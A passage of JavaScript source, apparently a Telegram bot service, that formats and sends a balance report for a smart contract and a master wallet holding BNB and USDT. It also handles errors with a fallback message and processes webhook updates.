            const escapedUSDTBalance = this.escapeHtml(masterUSDTBalance && masterUSDTBalance.balance ? masterUSDTBalance.balance : '0');
            const escapedContractError = contractBalance.error ? this.escapeHtml(String(contractBalance.error)) : null;
            const escapedBNBError = masterBNBBalance.error ? this.escapeHtml(String(masterBNBBalance.error)) : null;
            const escapedUSDTError = masterUSDTBalance.error ? this.escapeHtml(String(masterUSDTBalance.error)) : null;
            const escapedTimestamp = this.escapeHtml(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');

            let balancesMessage = `
📊 REAL BALANCE REPORT

`;

            // Contract USDT Balance
            if (process.env.CONTRACT_ADDRESS) {
                balancesMessage += `
💰 Smart Contract
• Address: ${escapedContractAddress}
• USDT Balance: ${escapedContractBalance} USDT
`;
                if (escapedContractError) {
                    balancesMessage += `• ⚠️ Error: ${escapedContractError}\n`;
                }
            } else {
                balancesMessage += `
💰 Smart Contract
• Address: Not configured
• USDT Balance: 0.00 USDT
`;
            }

            // Master Wallet Balances
            balancesMessage += `
🏦 Master Wallet
• Address: ${escapedMasterWallet}
• BNB Balance: ${escapedBNBBalance} BNB
• USDT Balance: ${escapedUSDTBalance} USDT
`;

            if (escapedBNBError) {
                balancesMessage += `• ⚠️ BNB Error: ${escapedBNBError}\n`;
            }
            if (escapedUSDTError) {
                balancesMessage += `• ⚠️ USDT Error: ${escapedUSDTError}\n`;
            }

            balancesMessage += `
🔄 Last Updated: ${escapedTimestamp}
`;

            await this.bot.sendMessage(chatId, balancesMessage, {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '📤 Pull USDT', callback_data: 'pull_list' },
                            { text: '📥 Withdraw', callback_data: 'withdraw' }
                        ],
                        [
                            { text: '🔄 Refresh Balances', callback_data: 'balances' },
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            });

            return result;
        } catch (error) {
            console.error('Error in balances command:', error && error.message ? error.message : error);

            // Create a clean error message
            const cleanErrorMessage = error && error.message
                ? error.message.replace(/[^a-zA-Z0-9\s.\,!\?-]/g, '').substring(0, 200)
                : 'Unknown error occurred';

            const errorMessage = `
❌ BALANCES FAILED
Error: ${this.escapeHtml(cleanErrorMessage)}

🔄 Last Updated: ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
    `;

            // Send with fallback
                        try {
                await this.bot.sendMessage(chatId, errorMessage, {
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '🏠 Main Menu', callback_data: 'menu' }
                            ]
                        ]
                    }
                });
            } catch (markdownError) {
                // Fallback without HTML
                const fallbackMessage = `
❌ BALANCES FAILED
Error: ${cleanErrorMessage}

🔄 Last Updated: ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
        `;
                await this.bot.sendMessage(chatId, fallbackMessage, {
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '🏠 Main Menu', callback_data: 'menu' }
                            ]
                        ]
                    }
                });
            }

            return this.bot.sendMessage(chatId, `❌ Error: ${cleanErrorMessage}`);
        }
    }

    // Process webhook updates manually
    async processUpdate(update) {
        if (this.bot) {
            try {
                console.log('Processing Telegram update:', JSON.stringify(update, null, 2));
                await this.bot.processUpdate(update);
            } catch (error) {
                console.error('Error processing Telegram update:', error && error.message ? error.message : error);
            }
        }
    }
}

module.exports = new TelegramService();


